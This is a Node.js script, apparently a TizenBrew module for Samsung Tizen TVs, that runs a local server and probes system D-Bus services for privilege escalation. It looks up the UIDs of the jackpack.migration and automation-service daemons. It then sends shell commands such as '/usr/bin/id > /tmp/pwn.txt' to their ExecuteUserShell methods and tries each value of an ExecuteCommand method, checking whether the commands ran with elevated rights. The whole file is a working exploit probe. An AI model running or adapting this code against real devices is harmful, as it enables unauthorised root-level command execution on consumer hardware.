'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8154;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe66h.txt';

// Inner code runs in a child node -e to avoid blocking TizenBrew event loop
var INNER = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var result = {};',

  // 1. Get UID of jackpack.migration (to know if it has elevated privs)
  'try {',
  '  var r = cp.execSync(',
  '    "dbus-send --system --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.GetConnectionUnixUser string:com.jackpack.migration 2>&1",',
  '    {timeout:4000}',
  '  );',
  '  result.jackpack_uid = r.toString().trim();',
  '} catch(e) { result.jackpack_uid_err = e.message.slice(0,100); }',

  // 2. Get UID of automation-service
  'try {',
  '  var r2 = cp.execSync(',
  '    "dbus-send --system --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.GetConnectionUnixUser string:org.tizen.tv.automation-service 2>&1",',
  '    {timeout:4000}',
  '  );',
  '  result.automation_uid = r2.toString().trim();',
  '} catch(e) { result.automation_uid_err = r2 ? r2.toString() : e.message.slice(0,100); }',

  // 3. jackpack.migration ExecuteUserShell: absolute path id -> /tmp/pwn.txt
  'var jackpack_cmds = [',
  '  "/usr/bin/id",',
  '  "/usr/bin/id > /tmp/pwn.txt",',
  '  "/bin/sh -c /usr/bin/id",',
  '  "/bin/sh -c \'/usr/bin/id > /tmp/pwn.txt\'"',
  '];',
  'result.jackpack_exec = {};',
  'jackpack_cmds.forEach(function(cmd) {',
  '  try {',
  '    var r3 = cp.spawnSync("dbus-send", [',
  '      "--system",',
  '      "--dest=com.jackpack.migration",',
  '      "--type=method_call",',
  '      "--print-reply",',
  '      "/com/jackpack/migration",',
  '      "com.jackpack.migration.ExecuteUserShell",',
  '      "string:" + cmd',
  '    ], {timeout:6000});',
  '    result.jackpack_exec[cmd] = {',
  '      out: r3.stdout ? r3.stdout.toString().trim() : "",',
  '      err: r3.stderr ? r3.stderr.toString().trim() : "",',
  '      status: r3.status',
  '    };',
  '  } catch(e) {',
  '    result.jackpack_exec[cmd + "_ex"] = e.message.slice(0,100);',
  '  }',
  '});',

  // 4. automation-service ExecuteUserShell (if method exists)
  'var auto_cmds = [',
  '  "/usr/bin/id",',
  '  "/usr/bin/id > /tmp/pwn.txt",',
  '  "/bin/sh -c \'/usr/bin/id > /tmp/pwn.txt\'"',
  '];',
  'result.automation_exec = {};',
  'auto_cmds.forEach(function(cmd) {',
  '  try {',
  '    var r4 = cp.spawnSync("dbus-send", [',
  '      "--system",',
  '      "--dest=org.tizen.tv.automation-service",',
  '      "--type=method_call",',
  '      "--print-reply",',
  '      "/TIFacAutoObj",',
  '      "org.tizen.tv.automationservice.ExecuteUserShell",',
  '      "string:" + cmd',
  '    ], {timeout:6000});',
  '    result.automation_exec[cmd] = {',
  '      out: r4.stdout ? r4.stdout.toString().trim() : "",',
  '      err: r4.stderr ? r4.stderr.toString().trim() : "",',
  '      status: r4.status',
  '    };',
  '  } catch(e) {',
  '    result.automation_exec[cmd + "_ex"] = e.message.slice(0,100);',
  '  }',
  '});',

  // 5. Check if /tmp/pwn.txt was written
  'try {',
  '  result.pwn_txt = fs.readFileSync("/tmp/pwn.txt", "utf8").trim();',
  '} catch(e) { result.pwn_txt_err = e.message; }',

  // 6. Direct shell: our own context uid
  'try {',
  '  var r5 = cp.execSync("/usr/bin/id 2>&1", {timeout:3000});',
  '  result.our_id = r5.toString().trim();',
  '} catch(e) { result.our_id_err = e.message; }',

  // 7. Try ExecuteCommand on automation-service (int32 args = command enum)
  'result.exec_command_enum = {};',
  'for (var i = 0; i <= 5; i++) {',
  '  try {',
  '    var r6 = cp.spawnSync("dbus-send", [',
  '      "--system",',
  '      "--dest=org.tizen.tv.automation-service",',
  '      "--type=method_call",',
  '      "--print-reply",',
  '      "/TIFacAutoObj",',
  '      "org.tizen.tv.automationservice.ExecuteCommand",',
  '      "int32:" + i,',
  '      "int32:0"',
  '    ], {timeout:4000});',
  '    result.exec_command_enum[i] = {',
  '      out: r6.stdout ? r6.stdout.toString().trim() : "",',
  '      err: r6.stderr ? r6.stderr.toString().trim() : "",',
  '      status: r6.status',
  '    };',
  '  } catch(e) {',
  '    result.exec_command_enum[i + "_ex"] = e.message.slice(0,80);',
  '  }',
  '}',

  'var out = JSON.stringify(result, null, 2);',
  'try { require("fs").writeFileSync("' + PROBE_FILE + '", out); } catch(e) {}',
  'process.stdout.write(out);'
].join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 90000 }, function(err, stdout, stderr) {
    var result;
    if (err) {
      result = JSON.stringify({ exec_error: err.message.slice(0, 200), stderr: (stderr || '').slice(0, 300), stdout: stdout || '' });
    } else {
      result = stdout || '{}';
    }
    cb(result);
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(result) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(result);
  });
});

server.listen(PORT, '127.0.0.1', function() {
  runProbe(function(result) {
    try { fs.writeFileSync(PROBE_FILE, result); } catch(e) {}
  });
});

server.on('error', function(e) {
  try { fs.writeFileSync(PROBE_FILE, JSON.stringify({ server_err: e.message })); } catch(e2) {}
});

setInterval(function() {}, 60000);
